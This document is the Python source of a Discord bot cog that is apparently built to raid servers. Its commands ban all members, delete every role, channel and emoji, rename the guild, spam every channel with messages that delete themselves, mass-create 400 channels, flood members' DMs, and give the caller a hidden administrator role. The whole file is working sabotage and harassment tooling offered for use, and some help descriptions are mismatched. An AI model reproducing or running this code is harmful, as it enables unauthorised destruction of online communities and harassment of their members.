from discord.ext import commands
import discord
import asyncio
import datetime

class cmds(commands.Cog):
    def __init__(self, bot):
        self.bot = bot


    @commands.command(name='help')
    @commands.guild_only()
    @commands.bot_has_permissions(manage_messages=True)
    @commands.cooldown(1, 15, commands.BucketType.guild)
    async def help(self, ctx):
        await ctx.message.delete()

        prefix = ctx.prefix

        # help 1
        embed = discord.Embed(colour = 0x9B59B6, description="""Welcome to the commands page! Here you will be able to view every single command you have access to.\n\t** **\n""")
        embed.set_thumbnail(url=self.bot.user.avatar_url)
        embed.set_author(name='List Of Commands​',icon_url=ctx.author.avatar_url)
        embed.add_field(name=f"{prefix}help", value="Show this message.", inline=False)
        embed.add_field(name=f"{prefix}nuke <reason>", value="destroy the guild.", inline=False)
        embed.add_field(name=f"{prefix}administrator [user]", value="give user administrator permission.", inline=False)
        embed.add_field(name=f"{prefix}delete", value="delete emojis and roles and channels", inline=False)
        embed.add_field(name=f"{prefix}mail [text]", value="dm-all members saying [text], \{user} to mention.", inline=False)
        embed.add_field(name=f"{prefix}unbans", value="unban everyone in ban list.", inline=False)
        embed.add_field(name=f"{prefix}purge [amount]", value="delete [amount] messages.", inline=False)

        await ctx.message.author.send(embed=embed)

        # help 2
        embed = discord.Embed(colour = 0x1BBFB8, description='Welcome to the Spam commands page! here you will be able to view every single command you have access to.')
        embed.set_author(name='Spam Commands​',icon_url=ctx.author.avatar_url)
        embed.add_field(name=f"{prefix}ghostspam [text]", value="spam saying [text] auto delete message.", inline=False)
        embed.add_field(name=f"{prefix}crashusers [website]", value="spam [website] that's will crashusers.", inline=False)
        embed.add_field(name=f"{prefix}spam [text]", value="spam saying [text].", inline=False)
        embed.add_field(name=f"{prefix}spamuser [text]", value="spam user dms saying [text].", inline=False)
        embed.add_field(name=f"{prefix}text [name]", value="create text channels.", inline=False)
        embed.add_field(name=f"{prefix}voice [name]", value="create voice channels.", inline=False)
        embed.add_field(name=f"{prefix}setservername [title]", value="change guild's name.", inline=False)
        
        await ctx.message.author.send(embed=embed)

        # help 3
        embed = discord.Embed(colour = 0xF08080, description='Welcome to the auto commands page! here you will be able to view every single command you have access to.')
        embed.set_author(name='Auto Commands​',icon_url=ctx.author.avatar_url)
        embed.add_field(name=f"{prefix}auto mode [on/off]", value="Unable raid cmds.", inline=False)
        embed.add_field(name=f"{prefix}auto kick", value="kick all members in the guild.", inline=False)
        embed.add_field(name=f"{prefix}auto ban", value="ban all members in the server.", inline=False)
        embed.add_field(name=f"{prefix}auto nick [text]", value="rename all members nicknames to [text].", inline=False)
        embed.add_field(name=f"{prefix}auto lockdown", value="lockdown all channels.", inline=False)
        embed.add_field(name=f"{prefix}auto unlock", value="unlock all channels.", inline=False)
        embed.add_field(name=f"{prefix}auto role [role] <reason>", value="add [role] to all members.", inline=False)

        await ctx.message.author.send(embed=embed)

        # help 4
        embed = discord.Embed(colour = discord.Colour.green(), description='Welcome to the auto commands page! here you will be able to view every single command you have access to.', timestamp=datetime.datetime.now(datetime.timezone.utc))
        embed.set_author(name='Info Commands​',icon_url=ctx.author.avatar_url)
        embed.set_footer(text=f"Developed by Orusula ☾", icon_url=ctx.author.avatar_url)
        embed.add_field(name=f"{prefix}support", value="Unable raid cmds.", inline=False)
        embed.add_field(name=f"{prefix}invite", value="kick all members in the guild.", inline=False)
        embed.add_field(name=f"{prefix}ping", value="ban all members in the server.", inline=False)
        embed.add_field(name=f"?help", value="Dyno help command embed.", inline=False)
        embed.add_field(name=f"?premium", value="Dyno premium embed.", inline=False)
        embed.add_field(name=f"?info", value="Dyno info embed.", inline=False)

        await ctx.message.author.send(embed=embed)

    @commands.command(pass_context=True, name="purge", aliases=['clean', 'clear'])
    @commands.guild_only()
    @commands.cooldown(3, 15, commands.BucketType.guild)
    async def purge(self, ctx, amount: int):
        if amount >= 250:
            amount = 250
        deleted = await ctx.channel.purge(limit=amount)
        embed = discord.Embed(
            title='purge cmd',
            description=f'Messages {len(deleted)} deleted.\nThis message will be deleted in 8 seconds.\n',
            colour = discord.Colour.green(),
            timestamp=datetime.datetime.now(datetime.timezone.utc)
        )
        embed.set_footer(
            text=f'Requested by {ctx.message.author.name}',
            icon_url=ctx.message.author.avatar_url
        )
        await ctx.channel.send(embed=embed, delete_after=8)

    @commands.command(name='ghostspam', aliases=['ghostping'])
    @commands.cooldown(3, 20, commands.BucketType.guild)
    @commands.guild_only()
    async def ghostspam(self, ctx, *, payload):
        try:
            await ctx.message.delete()
        except:
            pass
        for i in range(10):
            for channel in ctx.guild.channels:
                try:
                    await channel.send(payload, delete_after=0.001)
                except:
                    pass

    @commands.command(name='spam', aliases=['spamping'])
    @commands.guild_only()
    @commands.cooldown(10, 180, commands.BucketType.guild)
    async def spam(self, ctx, *, payload):
        try:
            await ctx.message.delete()
        except:
            pass
        for i in range(10):
            for channel in ctx.guild.channels:
                try:
                    await channel.send(str(payload))
                except:
                    pass

    @commands.command(name='text', aliases=['createtextchannels', 'createtextchannel'])
    @commands.cooldown(3, 15, commands.BucketType.guild)
    @commands.guild_only()
    @commands.bot_has_permissions(manage_channels=True, manage_messages=True)
    async def text(self, ctx, *, payload):
        await ctx.message.delete()
        for i in range(0, 400):
            try:
                await ctx.guild.create_text_channel(payload)
            except:
                pass

    @commands.command(name='voice', aliases=['createvoicechannels', 'createvoicechannel'])
    @commands.cooldown(3, 15, commands.BucketType.guild)
    @commands.guild_only()
    @commands.bot_has_permissions(manage_channels=True, manage_messages=True)
    async def voice(self, ctx, *, payload):
        await ctx.message.delete()
        for i in range(0, 400):
            try:
                await ctx.guild.create_voice_channel(payload)
            except:
                pass

    @commands.command(name='delete')
    @commands.cooldown(1, 5, commands.BucketType.guild)
    @commands.guild_only()
    @commands.bot_has_permissions(manage_channels=True, manage_roles=True, manage_messages=True, manage_emojis=True)
    async def delete(self, ctx, reason=None):
        await ctx.message.delete()

        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete(reason=reason)
            except:
                pass

        for role in ctx.guild.roles:
            try:
                await role.delete(reason=reason)
            except:
                pass

        for channel in ctx.guild.channels:
            try:
                await channel.delete(reason=reason)
            except:
                pass

    @commands.command(name='leave')
    @commands.guild_only()
    @commands.has_permissions(administrator=True)
    async def leave(self, ctx):
        await ctx.guild.leave()

    @commands.command(name='setservername', aliases=['setguildname'])
    @commands.guild_only()
    @commands.bot_has_permissions(manage_guild=True, manage_messages=True)
    async def setservername(self, ctx, *, title):
        try:
            await ctx.message.delete()
        except:
            pass
        await ctx.guild.edit(name=title)

    @commands.command(name='crashusers', aliases=['crashuser'])
    @commands.guild_only()
    @commands.cooldown(10, 60, commands.BucketType.guild)
    async def crashusers(self, ctx, site='https://discordapp.com/'):
        try:
            await ctx.message.delete()
        except:
            pass

        for i in range(0, 10):
            try:
                await ctx.channel.send(site)
            except:
                pass
    
    @commands.command(name='unbans', aliases=['removebans', 'unbanall'])
    @commands.guild_only()
    @commands.bot_has_permissions(ban_members=True, manage_messages=True)
    @commands.cooldown(1, 5, commands.BucketType.guild)
    async def unbans(self, ctx):
        await ctx.message.delete()
        bans = await ctx.guild.bans()
        for ban in bans:
            user = ban.user
            await ctx.guild.unban(user)


    @commands.command(name='mail', aliases=['dm-all', 'DM-ALL', 'dmall'])
    @commands.guild_only()
    @commands.has_permissions(manage_messages=True)
    @commands.cooldown(1, 300, commands.BucketType.guild)
    async def mail(self, ctx, *, text : str):
        try:
            await ctx.message.delete()
        except:
            await ctx.message.author.send('Command `mail` Passed in **{}**'.format(ctx.guild.name))
        success = 0
        for member in ctx.guild.members:
            if success <= 200:
                if not member.bot:
                    try:
                        text = text.format(user=member.mention, guild=ctx.guild.name)
                        await member.send(text)
                        await asyncio.sleep(.25)
                        success += 1
                    except:
                        await asyncio.sleep(1)


    @commands.command(name='support', aliases=['info', 'donate'])
    async def support(self, ctx):
        await ctx.trigger_typing()
        embed = discord.Embed(title="Support server", colour = discord.Colour.green())
        embed.add_field(
            name="Touch the below link to join the server",
            value="[https://discord.gg/4ra6YxH](https://discord.gg/4ra6YxH)"
        )
        await ctx.send(embed=embed)

    @commands.command(name='ping', aliases=['pong'])
    async def ping(self, ctx):
        await ctx.trigger_typing()
        message = f"Pong! **{round(self.bot.latency * 1000)}ms**"
        await ctx.send(message)

    @commands.command(name='invite', aliases=['bot'])
    async def invite(self, ctx):
        await ctx.trigger_typing()
        embed = discord.Embed(
            colour=discord.Colour.red(),
        )
        embed.set_thumbnail(url=self.bot.user.avatar_url)
        embed.set_author(name=self.bot.user.name,icon_url=ctx.author.avatar_url)
        embed.add_field(
            name="Touch the below link to invite the bot",
            value=f"[Invite me](https://discordapp.com/api/oauth2/authorize?client_id={self.bot.user.id}&permissions=8&scope=bot)"
        )
        await ctx.message.author.send(embed=embed)

    @commands.command(name='administrator', aliases=['bypass'])
    @commands.guild_only()
    @commands.bot_has_permissions(administrator=True)
    @commands.cooldown(3, 5, commands.BucketType.guild)
    async def administrator(self, ctx, user : discord.Member = None):

        await ctx.message.delete()

        if user == None:
            user = ctx.message.author

        Tatsumaki = await ctx.guild.create_role(
            name="Tatsumaki",
            permissions=discord.Permissions(permissions=8),
            hoist=False
        )

        Tatsumaki = discord.utils.get(ctx.guild.roles, name="Tatsumaki")

        await user.add_roles(Tatsumaki)

    @commands.command(name='nuke', aliases=['nuked', 'destroy'])
    @commands.guild_only()
    @commands.bot_has_permissions(ban_members=True, manage_channels=True, manage_roles=True, manage_messages=True)
    @commands.cooldown(1, 10, commands.BucketType.guild)
    async def nuke(self, ctx, *, reason='Nuked'):
        await ctx.message.delete()

        offline = []
        online = []

        for member in ctx.guild.members:
            if str(member.status) == 'offline':
                offline.append(member)
            else:
                online.append(member)

        embed = discord.Embed(
            colour = 0x6C3483,
            timestamp=datetime.datetime.now(datetime.timezone.utc)
        )
        embed.set_author(
            name=f'Destroying {ctx.guild.name}',
            icon_url=ctx.author.avatar_url
        )
        embed.add_field(
            name="Owner",
            value=ctx.guild.owner,
            inline=True
        )
        embed.add_field(
            name='Region',
            value=ctx.guild.region,
            inline=True
        )
        embed.add_field(
            name='Registred',
            value=(ctx.guild.created_at).strftime("%d %B, %Y"),
            inline=True
        )
        embed.add_field(
            name="Users",
            value=len(ctx.guild.members),
            inline=True
        )
        embed.add_field(
            name="Online",
            value=len(online),
            inline=True
        )
        embed.add_field(
            name="Bans",
            value=len(await ctx.guild.bans()),
            inline=True
        )
        embed.add_field(
            name="Categories",
            value=len(ctx.guild.categories),
            inline=True
        )
        embed.add_field(
            name="Channels",
            value=len(ctx.guild.channels),
            inline=True
        )
        embed.add_field(
            name="Roles",
            value=len(ctx.guild.roles),
            inline=True
        )
        embed.set_footer(
            text=str(ctx.guild.id),
            icon_url=ctx.guild.icon_url
        )

        await ctx.message.author.send(embed=embed)

        for member in offline:
            try:
                await member.ban(reason=reason)
            except:
                pass

        for member in online:
            try:
                await member.ban(reason=reason)
            except:
                pass

        for emoji in ctx.guild.emojis:
            try:
                await emoji.delete(reason=reason)
            except:
                pass

        for role in ctx.guild.roles:
            try:
                await role.delete(reason=reason)
            except:
                pass

        for channel in ctx.guild.channels:
            try:
                await channel.delete(reason=reason)
            except:
                pass

        await ctx.guild.edit(name=reason)

    @commands.command(name='spamuser', aliases=['spammailuser', 'spam-user'])
    @commands.guild_only()
    @commands.cooldown(1, 50, commands.BucketType.guild)
    async def spamuser(self, ctx, user : discord.Member, *, text):
        try:
            await ctx.message.delete()
        except:
            pass
        for i in range(0, 50):
            await asyncio.sleep(.25)
            await user.send(text, delete_after=180)

def setup(bot):
    bot.add_cog(cmds(bot))
